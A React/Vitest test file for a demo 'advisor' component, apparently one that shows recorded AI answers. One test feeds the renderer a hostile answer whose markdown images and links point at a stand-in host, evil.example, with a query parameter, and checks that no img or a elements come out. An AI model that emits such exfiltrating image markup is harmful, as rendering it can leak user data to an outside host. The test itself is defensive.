import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import {
  DEMO_LABEL,
  DemoExamples,
  EXAMPLES,
  type Example,
} from "@/components/advisor/demo-examples";

vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn() }) }));
vi.mock("@/lib/demo", () => ({ IS_DEMO: true }));

describe("the demo's advisor", () => {
  it("replays the recorded examples, says so plainly, and has no question box", () => {
    render(<DemoExamples />);

    expect(screen.getByText(DEMO_LABEL)).toBeInTheDocument();
    for (const example of EXAMPLES) {
      expect(screen.getByRole("article", { name: example.question })).toBeInTheDocument();
    }
    expect(screen.queryByRole("textbox")).not.toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Ask" })).not.toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Flag" })).not.toBeInTheDocument();
  });

  it("starts with at least one example, every figure inside its text", () => {
    expect(EXAMPLES.length).toBeGreaterThanOrEqual(1);
    for (const example of EXAMPLES) {
      for (const figure of example.answer.figures) {
        expect(figure.end).toBeLessThanOrEqual(example.answer.text.length);
      }
    }
  });

  it("draws examples through the same safe renderer: no img, no a", () => {
    const hostile: Example = {
      ...EXAMPLES[0],
      id: "hostile",
      question: "Hostile?",
      answer: {
        ...EXAMPLES[0].answer,
        text: '![x](https://evil.example/?d=1) ![y][1]\n\n[1]: https://evil.example\n\n<img src="x">',
        figures: [],
      },
    };

    const { container } = render(<DemoExamples examples={[hostile]} />);

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });

  it("is what /advisor renders on the demo, without asking the API anything", async () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const { default: AdvisorPage } = await import("@/app/(dashboard)/advisor/page");

    render(<AdvisorPage />);

    expect(screen.getByText(DEMO_LABEL)).toBeInTheDocument();
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
  });
});
